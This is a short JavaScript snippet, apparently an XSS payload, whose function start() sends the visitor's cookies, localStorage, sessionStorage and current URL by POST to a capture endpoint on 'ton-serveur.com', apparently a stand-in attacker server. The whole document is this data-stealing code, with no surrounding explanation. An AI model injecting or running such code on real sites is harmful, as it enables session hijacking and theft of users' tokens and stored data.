function start() {
    
    fetch("https://ton-serveur.com/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            cookies: document.cookie,
            localStorage: JSON.stringify(localStorage),
            sessionStorage: JSON.stringify(sessionStorage),
            url: window.location.href
        })
    });
}
